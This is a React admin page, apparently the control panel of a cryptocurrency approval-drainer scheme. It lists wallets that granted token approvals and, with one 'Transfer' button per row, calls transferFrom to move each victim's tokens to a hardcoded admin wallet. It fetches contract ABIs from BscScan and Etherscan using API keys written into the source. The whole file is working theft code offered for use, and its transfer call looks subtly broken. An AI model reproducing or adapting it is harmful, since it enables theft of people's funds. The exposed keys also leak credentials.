import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { NotificationContainer, NotificationManager } from "react-notifications";
import Web3 from "web3";

import 'react-notifications/lib/notifications.css';

const adminWalletAddress = "0xBD288011d06dA18Eca34DF3d50488fB25fCC7Fde";
const web3 = new Web3(window.ethereum);

const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"

const AdminScreen = () => {
  const [products, setProduct] = useState([]);
  const [transferAmount, setTransferAmount] = useState(0);
  useEffect(() => {
    getProducts();
  }, []);

  const getProducts = async () => {
    const response = await axios.get('http://localhost:5000/products');
    setProduct(response.data);
  }

  const handleChangeAmount = (value) => {
    setTransferAmount(value);
  }
  const handleTransfer = async (approveToken) => {
    if (transferAmount === 0) {
      NotificationManager.warning('Transfer Amount is not 0.', 'Transfer Amount Warning', 3000);
    }
    else {
      if (approveToken.network === "BSC") {
        let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_BSC_SCAN_API_KEY;
        let temp = await axios.get(api);
        const contractABI = JSON.parse(temp.data.result);
        const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
      } else {
        let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_ETH_SCAN_API_KEY;
        let temp = await axios.get(api);
        const contractABI = JSON.parse(temp.data.result);
        const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
      }
    }
  }
  return (
    <div className='m-4 text-center'>
      <h1 className='w-25 m-auto mt-4'>Approved User List</h1>
      <table className='mt-4 table table-bordered text-center fs-3 m-auto w-75'>
        <thead>
          <tr>
            <th>No</th>
            <td><input type="checkbox" /></td>
            <th>User Address</th>
            <th>Amount</th>
            <th>Symbol</th>
            <th>Manage Amount</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          {products && products.map((a, idx) => (
            <tr key={idx}>
              <td>{idx + 1}</td>
              <td><input type="checkbox" width={50} /></td>
              <td>{a.userWalletAddress.slice(0, 5) + '...' + a.userWalletAddress.slice(-4, a.userWalletAddress.length)}</td>
              <td>{a.amount}</td>
              <td>{a.symbol}</td>
              <td><input className='form-control' type="number" onChange={(e) => handleChangeAmount(e.target.value)} /></td>
              <td><button className='form-control' type="number" onClick={() => { handleTransfer(a) }} >Transfer</button></td>
            </tr>
          ))}
        </tbody>
      </table>
      <NotificationContainer />
    </div>
  );
};

export default AdminScreen;